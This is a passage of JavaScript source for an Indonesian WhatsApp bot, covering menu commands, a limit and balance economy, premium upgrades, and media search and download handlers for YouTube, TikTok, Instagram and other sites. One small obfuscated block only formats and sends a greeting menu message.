 description: ``,
 rowId: `${prefix}${x}`
 }
 ]
 }
 list.push(yy)
 }
 listmsg(from, 
`Selamat ${waktoo} ✨`, 
`Hai kak ${pushname}
`, 
`LIST MENU CLICK HERE`,
`Runtime : ${kyun(process.uptime())}
Speed : ${processsTime(mek.messageTimestamp.low, moment())}s

Klik Di Bawah Ya Kak 😊`, list)
} else {
menu1 = `Selamat ${waktoo} ${pushname==undefined?sender.split("@")[0]:pushname} ✨

─ *YOUR INFO* ─ 

⬣ Nama : ${pushname} 
⬣ Tag : @${sender.split("@")[0]} 
⬣ Status : ${isOwner?`Owner ⚔️`:isPrem?`Premium 🏅`:`Free User`} 
⬣ Expired Prem : ${isOwner?`Unlimited Owner`:isPrem ? `${cekvipp.days}d, ${cekvipp.hours}h, ${cekvipp.minutes}m, ${cekvipp.seconds}s`:'Not Premium'}
⬣ Limit : ${isOwner?`Unlimited Owner`:isPrem ? `Unlimited Premium` : getLimit(sender, limitawal, limit) +' / '+limitawal}
⬣ Limit Game : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
⬣ Balance : $${getBalance(sender, balance)}

─ *LIST FITUR* ─
${f}${prefix}ALLFITUR
${f}${prefix}FITURDOWNLOAD
${f}${prefix}FITURGRUP
${f}${prefix}FITURFUN
${f}${prefix}FITURCONVERT
${f}${prefix}FITURSEARCH
${f}${prefix}FITUREDITING
${f}${prefix}FITURTEXTMAKER
${f}${prefix}FITURANIME
${f}${prefix}FITURSESSION
${f}${prefix}FITURSTORAGE
${f}${prefix}FITURABOUTLIMIT
${f}${prefix}FITUROTHER
${f}${prefix}FITURGABUT
${f}${prefix}FITUR OWNER

Subscribe Herman Chanel

─ 「 *TQ TO* 」 ─
${f} *FARID*
${f} *APRI*
${f} *ALDI FAUZI*
${f} *Xinzz*
${f} *Herman*
${f} *COMEL*
${f} *PENYEDIA API*
${f} *MHANKBARBAR*`
let gbutsan = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: '👑 OWNER' }, type: 1 }
]
function _0x5a5c(_0x2f9df4,_0x3136ce){const _0xd98a75=_0xd98a();return _0x5a5c=function(_0x5a5c9a,_0x34f1eb){_0x5a5c9a=_0x5a5c9a-0x16d;let _0x1d2a87=_0xd98a75[_0x5a5c9a];return _0x1d2a87;},_0x5a5c(_0x2f9df4,_0x3136ce);}function _0xd98a(){const _0x1393ca=['6511250cMYpmO','243kSsIzb','180830SKvcXO','Selamat\x20','223640aKMNwo','7203DUuuKW','77629XZkrMn','5245916oTHlOV','51quIXuJ','6134940xPDpRn','4854RGBceg'];_0xd98a=function(){return _0x1393ca;};return _0xd98a();}const _0x5aa11e=_0x5a5c;(function(_0x5139a4,_0x20955c){const _0xfb740d=_0x5a5c,_0xd4da82=_0x5139a4();while(!![]){try{const _0x296bdc=-parseInt(_0xfb740d(0x172))/0x1+parseInt(_0xfb740d(0x16e))/0x2*(parseInt(_0xfb740d(0x174))/0x3)+-parseInt(_0xfb740d(0x173))/0x4+parseInt(_0xfb740d(0x177))/0x5+parseInt(_0xfb740d(0x176))/0x6*(parseInt(_0xfb740d(0x171))/0x7)+-parseInt(_0xfb740d(0x170))/0x8*(parseInt(_0xfb740d(0x16d))/0x9)+-parseInt(_0xfb740d(0x175))/0xa;if(_0x296bdc===_0x20955c)break;else _0xd4da82['push'](_0xd4da82['shift']());}catch(_0x2a93ce){_0xd4da82['push'](_0xd4da82['shift']());}}}(_0xd98a,0xdf3cb));let gbuttonan={'locationMessage':{'degressLongitude':0x0,'degressLatitude':0x1,'address':'a','jpegThumbnail':gambar},'contentText':''+menu1,'footerText':_0x5aa11e(0x16f)+waktoo,'buttons':gbutsan,'headerType':0x6};await YANZ['sendMessage'](from,gbuttonan,MessageType['buttonsMessage'],{'contextInfo':{'externalAdReply':{},'mentionedJid':[sender],'forwardingScore':0x989680,'isForwarded':!![]}});
}
 break
case 'fiturtextmaker': case 'menutextmaker':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.maker(f, prefix))
break
case 'fiturdownload': case 'fiturdownloader': case 'downloadmenu': case 'menudownload':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.download(f, prefix))
break
case 'menuconvert': case 'convertmenu': case 'fiturconvert': case 'fiturconverting':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.convert(f, prefix))
break
case 'grupmenu': case 'menugrup': case 'fiturgrup':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.grup(f, prefix))
break
case 'menusearch': case 'searchmenu': case 'fitursearch': case 'fiturshearching':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.search(f, prefix))
break
case 'fituranime': case 'menuanime': case 'animemenu':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.anime(f, prefix))
break
case 'fiturfun': case 'menufun': case 'funmenu':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.fun(f, prefix))
break
case 'fiturediting': case 'menuediting': case 'editingmenu':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.editing(f, prefix))
break
case 'fiturstorage': case 'storagemenu': case 'menustorage':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.storage(f, prefix))
break
case 'fitursession': case 'fiturmultisession': case 'menusession': case 'sessionmenu':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.session(f, prefix))
break
case 'menulimit': case 'menuaboutlimit': case 'fiturlimit': case 'fituraboutlimit':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.aboutlimit(f, prefix))
break
case 'fiturothers': case 'fiturother': case 'menuother': case 'menuothers':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.others(f, prefix))
break
case 'fiturowner': case 'menuowner': case 'ownermenu':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.owner(f, prefix))
break
case 'fiturgabut': case 'menugabut':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(menu.gabut(f, prefix))
break









case 'topbalance':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
if(!isGroup)return reply(mess.only.group)

let txot = `*── 「 TOP BALANCE 」 ──*\n\n`
let mebn = [];
for (let i of balance){
mebn.push(i.id)
let bl = (i.balance)
txot += `*ID :* @${i.id.split("@")[0]}\n➸ Balance : ${bl}\n\n`
  }
mentions(txot, mebn, true)
break
case 'toplimit':{
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
if(!isGroup)return reply(mess.only.group)

let txot = `*── 「 TOP TIKET LIMIT 」 ──*\n\n`
let mebn = [];
for (let i of limit){
mebn.push(i.id)
let bl = (i.limit)
txot += `*ID :* @${i.id.split("@")[0]}\n➸ Limit : ${bl}\n\n`
  }
mentions(txot, mebn, true)
}
break
case 'topglimit':{
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
if(!isGroup)return reply(mess.only.group)

let txot = `*── 「 TOP TIKET GAME LIMIT 」 ──*\n\n`
let mebn = [];
for (let i of glimit){
mebn.push(i.id)
let bl = (i.glimit)
txot += `*ID :* @${i.id.split("@")[0]}\n➸ Glimit : ${bl}\n\n`
  }
mentions(txot, mebn, true)
}
break
case 'bal': case 'limit': case 'ceklimit': case 'balance': case 'glimit':
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(`*Selamat ${waktoo} @${sender.split("@")[0]}*✨

*${f} Limit : ${isPrem ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}*
*${f} Limit Game : ${cekGLimit(sender, gcount, glimit)} / ${gcount}*
*${f} Balance : $${getBalance(sender, balance)}*


Kamu Dapat Membeli Limit Dengan ${prefix}Buylimit *Nominal* Dan ${prefix}Buyglimit *Nominal* Untuk Membeli Game Limit

*EXAMPLE :*
${prefix}buylimit 10
${prefix}buyglimit 10

NOTE : 
- Harga Limit Perlimit adalah $100 balance`)
break
case 'level':{
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
reply(`@${sender.split("@")[0]}

*${f} Level : ${getLevelingLevel(sender)}*
*${f} Xp : ${getLevelingXp(sender)}*`)
}
break
case 'giftlimit': case 'givelimit':
if (!mek.key.fromMe) return reply(`Bot, Gaboleh :v`)
if (isPrem) return reply(`User Premium Tidak Bisa Melakukan Gift Limit`)
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
if (!isGroup) return reply(mess.only.group)
if (!q.includes('|')) return  reply(`Salah!! \nContoh ${prefix + command} _@TagMember | Nominal_`)
   const tujuan = q.substring(0, q.indexOf('|') - 1)
   const jumblah = q.substring(q.lastIndexOf('|') + 1)
   if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
   if (jumblah < 1 ) return reply(`minimal transfer 1`)
   if (getLimit(sender, limitawal, limit) < jumblah) return reply(`limit mu tidak mencukupi untuk melakukan gift limit`)
   const tujuantf = `${tujuan.replace("@","")}@s.whatsapp.net`
   hasiltf = jumblah
   giveLimit(tujuantf, hasiltf, limit)
   beliprem(sender, jumblah)
reply(`─ 「 *SUKSES* 」 ─

TRANSFERAN ANDA SUKSES DI KIRIM!

*👤PENGIRIM :* @${sender.split("@")[0]}
*👤PENERIMA :* ${tujuan}
*🎟JUMLAH LIMIT :* ${jumblah}

Pastikan Benar
Contoh : 
${prefix}giftlimit @0 | 10 (✅BENAR)
${prefix} Giftlimit @0 | 10 (❌SALAH)

*NOTE :*
Cara Transfer Salah? Tanggung Sendiri Masalahnya:v`)
break      	
case 'giftglimit': case 'giveglimit':{
if (mek.key.fromMe) return reply(`Bot, Gaboleh :v`)
if (isPrem) return reply(`User Premium Tidak Bisa Melakukan Gift Game Limit`)
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
if (!isGroup) return reply(mess.only.group)
if (!q.includes('|')) return  reply(`Salah!! \nContoh ${prefix + command} _@TagMember | Nominal_`)
   const tujuan = q.substring(0, q.indexOf('|') - 1)
   const jumblah = q.substring(q.lastIndexOf('|') + 1)
   if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
   if (jumblah < 1 ) return reply(`minimal transfer 1`)
   if (cekGLimit(sender, gcount, glimit) < jumblah) return reply(`game limit mu tidak mencukupi untuk melakukan gift game limit`)
   const tujuantf = `${tujuan.replace("@","")}@s.whatsapp.net`
   hasiltf = jumblah
   givegame(tujuantf, hasiltf, glimit)
   belipremgame(sender, jumblah)
reply(`─ 「 *SUKSES* 」 ─

TRANSFERAN ANDA SUKSES DI KIRIM!

*👤PENGIRIM :* @${sender.split("@")[0]}
*👤PENERIMA :* ${tujuan}
*🎟JUMLAH GAME LIMIT :* ${jumblah}

Pastikan Benar
Contoh : 
${prefix}${command} @0 | 10 (✅BENAR)
${prefix} ${command} @0 | 10 (❌SALAH)

*NOTE :*
Cara Transfer Salah? Tanggung Sendiri Masalahnya‼️`)
}
break      	
case 'buyprem': case 'beliprem':
if (isPrem) return reply('Kamu Sudah Menjadi User Premium')
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
if (getLimit(sender, limitawal, limit) < 1000) return reply(`Limitmu Tidak Cukup.\nDi Perlukan 1000 Limit Untuk Menjadi User Premium Trial 3 Hari`)
_prem.addPremiumUser(`${sender}`, `3d`, premium)
replybutton1(from, `${prefix}cekprem`,`Klik Di Bawah Untuk Mengecek Waktu Expired`, `CEK PREM`, `*KAMU SEKARANG ADALAH USER PREMIUM*`)
beliprem(sender, 1000)
break
case 'buylimit':{
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
if (!q) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
if (q.includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(q)) return reply(`Harus berupa angka`)
let ane = Number(nebal(q) * 100)
if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, ane, balance)
giveLimit(sender, nebal(q), limit)
reply(`Pembeliaan limit sebanyak ${q} berhasil

*${f}Sisa Balance : $${getBalance(sender, balance)}*
*${f}Sisa Limit : ${getLimit(sender, limitawal, limit)} / ${limitawal}*`)
}
break

case 'buyglimit':{
if (isBan) return reply(mess.ban)
if (!isUser) return reply(mess.noregis)
if (!q)return reply(`Example : ${prefix + command} 10\n\nHarga 1 limit = $100 balance`)
if (q.includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(q)) return reply(`Harus berupa angka`)
const koinPerlimit = 100
const total = koinPerlimit * q
if (getBalance(sender,balance) <= total) return reply(`maaf Balance kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
kurangBalance(sender, total, balance)
givegame(sender, q, glimit)
reply(`Pembeliaan game limit sebanyak ${q} berhasil

*${f}Sisa Balance : $${getBalance(sender, balance)}*
*${f}Sisa Game Limit : ${cekGLimit(sender, gcount, glimit)} / ${gcount}*`)
}
break
  case 'google':
  case 'googles':
  case 'gs':
  case 'googlesearch':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* _query_`)
  reply(mess.wait)
  anu = await fetchJson(`http://api.lolhuman.xyz/api/gsearch?apikey=${lolkey}&query=${q}`, {method: 'get'})
  teks = `─ 「 *GOOGLE SEARCH* 」 ─\n\n*Hasil Pencarian Dari ${q}*\n\n`
  o = 1
  for (let plor of anu.result) {
   teks += `*${o++}. ${plor.title}*\n*Desc :* ${plor.desc}\n*Link :* ${plor.link}\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n`
  }
  reply(teks.trim())
  break
  case 'playstore':
  case 'ps':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if(!q) return reply('nyari apa?')
  reply(mess.wait)
  let play = await hx.playstore(q)
   let store = `*「 PLAY STORE 」*

*Hasil Pencarian Dari : ${q}*

`
  for (let i of play){
  store += `
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━`
  }
  reply(store)
  break
  case 'brainly':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  brainly(`${q}`).then(res => {
  teks = `─ 「 *BRAINLY* 」 ─\n\n*Hasil Pencarian Dari ${q}*\n\n`
  for (let Y of res.data) {
  teks += `*➸ PERTANYAAN :* ${Y.pertanyaan}\n*➸ JAWABAN :* ${Y.jawaban[0].text}\n\n`
  }
  YANZ.sendMessage(from, teks, text, {quoted: mek, detectLinks: false})
  })
  break

   case 'mediafire':
  if (!isPrem) return reply(mess.only.prem)
  if (args.length < 1) return reply('Link Nya Mana? ')
  if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Linknya Error :v')
  reply(mess.wait)
  teks = args.join(' ')
  res = await mediafireDl(teks)
  result = `━━━• *MEDIAFIRE* •━━━

*Data Berhasil Didapatkan!*
▢ Nama : ${res[0].nama}
▢ Ukuran : ${res[0].size}
▢ Link : ${res[0].link}

_*Tunggu Proses Upload Media......*_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
break

case 'igdl':
case 'igpost':
case 'ig':
case 'instagram':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
if (args.length < 1) return reply(`LINKNYA MANA?`)
if (!isUrl) return reply('Linknya?')
if (!q) return reply('Link Yang Mana? ')
if (!q.includes('instagram')) return reply(mess.error)
reply(`Tunggu sebentar...

Note : kalo lama / error coba pakai yang #igtv link`)
anu = await igDownloader(`${q}`)
.then((data) => { sendMediaURL(from, data.result.link, data.result.desc, mek) })
.catch((err) => { reply(String(err)) })
break
case 'igtv': case 'tvig': case 'instagramtv':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
if (args.length < 1) return reply(`LINKNYA MANA?`)
if (!isUrl) return reply('Linknya?')
reply(mess.wait)
anu = await fetchJson(`http://lolhuman.herokuapp.com/api/instagram?apikey=${lolkey}&url=${q}`, {method: 'get'})
if (anu.error) return reply(anu.error)
buffer = await getBuffer(anu.result)
YANZ.sendMessage(from,buffer,video,{mimetype: 'video/mp4', quoted: mek})
break
 
  
  case 'tiktoknowm':
  if (isBan) return reply(mess.ban)
  if (!isPrem && !isOwner && !mek.key.fromMe) return reply(mess.only.prem)
  if (!isUrl(args[0]) && !args[0].includes('tiktok')) return reply('Link Error')
  tiktokDown(`${args[0]}`)
  .then(res => {
  reply(mess.wait)
  var njir = res.result.nowatermark
  sendFileFromUrl(njir, video, {caption: `Niih Kak ${pushname}`, mimetype:'video/mp4',filename: `TIKTOKNOWM.mp4`, quoted:mek})
  })
  break
  case 'tiktokaudio':
  case 'tiktokmusic':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (!isUrl(args[0]) && !args[0].includes('tiktok')) return reply('Link Error')
  ayo = await getBuffer(`http://api.lolhuman.xyz/api/tiktokmusic?apikey=${lolkey}&url=${args[0]}`)
  YANZ.sendMessage(from, buffer, audio, {mimetype: 'audio/mp3', filename: 'TiktokMusic-MUZZABOR.mp3', quoted: mek})
  break
  case 'tiktok':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (!q) return reply('Linknya?')
  if (!q.includes('tiktok')) return reply(mess.error)
  reply(mess.wait)
  data = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${q}`)
  buttoins = [
  {buttonId: `${prefix}tiktok3 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},
  {buttonId: `${prefix}tiktoknowm ${q}`,buttonText:{displayText: `▶️ Video (NO WM)`},type:1},
  {buttonId:`${prefix}tiktokaudio ${q}`,buttonText:{displayText:'🎵 Audio'},type:1}]
  ahhh = await getBuffer(data.result.thumbnail)
  const gambra = await YANZ.prepareMessage(from, ahhh, MessageType.image, {thumbnail: gambar})
  const ButtonsMessages = {
    contentText: `⚜️ *Nickname*: ${data.result.author.nickname}\n❤️ *Like*: ${data.result.statistic.diggCount}\n💬 *Komentar*: ${data.result.statistic.commentCount}\n🔁 *Share*: ${data.result.statistic.shareCount}\n🎞️ *Views*: ${data.result.statistic.playCount}\n📑 *Desc*: ${data.result.title}`,
    buttons: buttoins,
    footerText: `Pilih Jenis Media Di Bawah ini`,
    headerType: 4,
    imageMessage: gambra.message.imageMessage
    }
  YANZ.sendMessage(from, ButtonsMessages, MessageType.buttonsMessage, {quoted : mek})
 }
 break
  case 'tiktok2':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (!isUrl(args[0]) && !args[0].includes('tiktok')) return reply('Link Error')
  tiktokDown(`${args[0]}`)
  .then(res => {
  reply(mess.wait)
  var njur = res.result.watermark
  sendFileFromUrl(njur, video, {caption: `Niih Kak ${pushname}`, mimetype:'video/mp4',filename: `TIKTOKNOWM.mp4`, quoted:mek})
  })
  break
  case 'tiktok3':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (!isUrl(args[0]) && !args[0].includes('tiktok')) return reply('Link Error')
  reply(mess.wait)
  anu = await TiktokDownloader(`${q}`)
  .then((data) => { sendMediaURL(from, data.result.watermark) })
  .catch((err) => { reply(String(err)) })
  break

  case 'playvideo': case 'playmp4': case 'ytmp4': case 'ytvideo':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (!q) return reply(`Example : ${prefix+command} query`)
  reply(mess.wait)
  try {
  let yut = await yts(q)
  ytv(yut.videos[0].url)
  .then((res) => {
  const { dl_link, thumb, title, filesizeF, filesize } = res
  axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
  .then((a) => {
  if (Number(filesize) >= 40000) return YANZ.sendMessage(from, `*─ 「 YOUTUBE VIDEO 」─*\n\n*▢ Title :* ${title}\n*▢ Filesize :* ${filesizeF}\n*▢ Upload :* ${yut.videos[0].ago}\n*▢ Ditonton :* ${yut.videos[0].views}\n*▢ Duration :* ${yut.videos[0].timestamp}\n\n\`\`\`UKURAN FILE TERLALU BESAR !\`\`\``, text, {contextInfo :{text: 'hi',"forwardingScore": 1000000000,isForwarded: false,sendEphemeral: false,"externalAdReply": {"title": `DOWNLOAD SECARA MANUAL`,"body": `KLIK DISINI!`,"previewType": "PHOTO","thumbnailUrl": imagebbthumb,"thumbnail": gambar2,"sourceUrl": `${a.data}`},mentionedJid:[`─ 「 YOUTUBE AUDIO 」─\n\n*▢ Title :* ${title}\n*▢ Filesize :* ${filesizeF}\n*▢ Upload :* ${yut.videos[0].ago}\n*▢ Ditonton :* ${yut.videos[0].views}\n*▢ Duration :* ${yut.videos[0].timestamp}\n\n\`\`\`UKURAN FILE TERLALU BESAR !\`\`\``]}, quoted : mek})
  YANZ.sendMessage(from, thumb, image, {caption: `─ 「 YOUTUBE VIDEO 」─\n\n*▢ Title :* ${title}\n*▢ Filesize :* ${filesizeF}\n*▢ Upload :* ${yut.videos[0].ago}\n*▢ Ditonton :* ${yut.videos[0].views}\n*▢ Duration :* ${yut.videos[0].timestamp}\n*▢ LINK :* ${yut.videos[0].url}\n\n\`\`\`Tunggu Sebentar, Video Sedang Dikirim\`\`\``, quoted : mek})
  sendFileFromUrl(dl_link, video, {mimetype: 'video/mp4',quoted:mek})
  })
  })
  } catch (err) {
  console.log('Error : %s', color(err, 'red'))
  reply(`ERROR HEHEHE`)
  }
  }
  break
  case 'playaudio': case 'ytplayaudio': case 'ytmusic': case 'ytaudio': case 'ytmp3': case 'playmp3':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (!q) return reply(`Example : ${prefix+command} query`)
  reply(mess.wait)
  res = await yts(q)
   if (Number(res.all[0].seconds) >= 3000) return reply(`Error! Ukuran File Terlalu Besar!!`)
  let thumbInfo = `*─ 「 YOUTUBE AUDIO 」─*

*◯ Judul :* ${res.all[0].title}
*◯ Diupload :* ${res.all[0].ago}
*◯ Penonton :* ${res.all[0].views}
*◯ Durasi :* ${res.all[0].timestamp}

*◯ Deskripsi :* 
${res.all[0].description}`
  const gambra = (await YANZ.prepareMessageMedia({url:res.all[0].image},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage
  const buttonsssok = [
 {buttonId: `${prefix}pleybuttonaudio ${q}`, buttonText: {displayText: `AUDIO`}, type: 1},
{buttonId: `${prefix}pleybuttondoc ${q}`, buttonText: {displayText: `DOCUMENT`}, type: 1},
{buttonId: `${prefix}pleybuttonvn ${q}`, buttonText: {displayText: `VOICE NOTE`}, type: 1}
  ]
  const ButtonsMessagees = {
  contentText: thumbInfo,
  buttons: buttonsssok,
  footerText: `Silahkan Pilih Jenis File Dibawah Ini`,
  headerType: 4,
  imageMessage: gambra
  }
  await YANZ.sendMessage(from, ButtonsMessagees, MessageType.buttonsMessage, {quoted : mek})
  }
break
case 'pleybuttonvideo':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  reply(mess.wait)
  let yut = await yts(q)
  ytv(yut.videos[0].url)
  .then((res) => {
  const { dl_link, thumb, title, filesizeF, filesize } = res
  axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
  .then((a) => {
  if (Number(filesize) >= 40000) return reply('FILE TERLALU BESAR!!!')
  sendFileFromUrl(dl_link, video, {mimetype: 'video/mp4',quoted:mek})
  })
  })
  }
break
case 'pleybuttonaudio':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  reply(mess.wait)
  let yut = await yts(q)
  yta(yut.videos[0].url)
  .then((res) => {
  const { dl_link, thumb, title, filesizeF, filesize } = res
  axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
  .then((a) => {
  if (Number(filesize) >= 40000) return reply('FILE TERLALU BESAR!!!')
  sendFileFromUrl(dl_link, audio, {mimetype: 'audio/mp4', quoted:mek})
  })
  })
  }
break
case 'pleybuttondoc':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  reply(mess.wait)
  let yut = await yts(q)
  yta(yut.videos[0].url)
  .then((res) => {
  const { dl_link, thumb, title, filesizeF, filesize } = res
  axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
  .then((a) => {
  if (Number(filesize) >= 40000) return reply('FILE TERLALU BESAR!!!')
  sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title+'.mp3'}`, quoted:mek})
  })
  })
  }
break
 case 'pleybuttonvn':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  reply(mess.wait)
  let yut = await yts(q)
  yta(yut.videos[0].url)
  .then((res) => {
  const { dl_link, thumb, title, filesizeF, filesize } = res
  axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
  .then((a) => {
  if (Number(filesize) >= 40000) return reply('FILE TERLALU BESAR!!!')
  sendFileFromUrl(dl_link, audio, {ptt:true, quoted:mek})
  })
  })
  }
  break
  case 'ytdl':
  case 'ytplay':
  case 'play':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (!q) return reply(`Example : ${prefix+command} query`)
  reply(mess.wait)
  res = await yts(q)
   if (Number(res.all[0].seconds) >= 3000) return reply(`Error! Ukuran File Terlalu Besar!!`)
  let thumbInfo = `*─ 「 YOUTUBE 」─*

*◯ Judul :* ${res.all[0].title}
*◯ Diupload :* ${res.all[0].ago}
*◯ Penonton :* ${res.all[0].views}
*◯ Durasi :* ${res.all[0].timestamp}
*◯ LINK :* ${res.all[0].url}
*◯ Deskripsi :* 
${res.all[0].description}`
 const gambra = (await YANZ.prepareMessageMedia({url:res.all[0].image},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage
const buttonsssok = [
  {buttonId:`${prefix}pleybuttonvideo ${res.all[0].url}`,buttonText:{displayText:'VIDEO '},type:1},
  {buttonId:`${prefix}pleybuttonaudio ${res.all[0].url}`,buttonText:{displayText:'AUDIO'},type:1}
  ]
  const ButtonsMessagees = {
  contentText: thumbInfo,
  buttons: buttonsssok,
  footerText: `Silahkan Pilih Jenis File Dibawah Ini`,
  headerType: 4,
  imageMessage: gambra
  }
  YANZ.sendMessage(from, ButtonsMessagees, MessageType.buttonsMessage, {quoted: mek})
  }
  break 
 case 'yts':
case 'youtubesearch':
case 'ytsearch':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* _query_`)
reply(mess.wait)
yts(q)
.then((res) => {
let yt = res.videos
let txt = `─ 「 *YOUTUBE SEARCH* 」 ─

*Hasil Pencarian : ${q}*\n`
l = 1
  for (let i = 0; i < 15; i++){
txt += `\n${l++}. *JUDUL :* ${yt[i].title}\n  *ID :* ${yt[i].videoId}\n  *UPLOAD :* ${yt[i].ago}\n  *DITONTON :* ${yt[i].views}\n  *DURATION :* ${yt[i].timestamp}\n  *URL :* ${yt[i].url}\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n`
}
sendFileFromUrl(yt[0].image, image, {caption: txt, quoted:mek})
})
.catch((err) => {
sendMess(ownerNumber, 'YT SEARCH Error : ' + err)
console.log(color('[YT SEARCH]', 'red'), err)
reply(mess.error)
})
}
break
case 'wiki': case 'wikipedia':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
reply(mess.wait)
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_Error Hasil Tidak Ditemukan_') 
}) 
result = `*JUDUL :* ${res[0].judul}

*WIKI :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
reply(result)
})
break
case 'pinterest': case 'pin':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* _query_`)
reply(mess.wait)
let pin = await hx.pinterest(q)
let ac = pin[Math.floor(Math.random() * pin.length)]
let di = await getBuffer(ac)
await YANZ.sendMessage(from,di,image,{thumbnail:gambar2, quoted: mek})
break
 case 'distance': case 'jarak':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
    if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
    if (args.length < 1) return reply(`Penggunaan ${command} tempat1|tempat2`)
    if (!q.includes("|")) return reply(`Penggunaan ${command} tempat1|tempat2`)
    fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${lolkey}&kota1=${q.split('|')[0].trim()}&kota2=${q.split('|')[1].trim()}`)
    .then((res) =>{
  let x = res.result
  let ini_txt = `Informasi Jarak dari ${q.split('|')[0].trim()} ke ${q.split('|')[1].trim()} :\n\n`
  ini_txt += `\`\`\`◪ Asal :\`\`\` ${x.from.name}\n`
  ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.from.latitude}\n`
  ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
  ini_txt += `\`\`\`◪ Tujuan :\`\`\` ${x.to.name}\n`
  ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.to.latitude}\n`
  ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
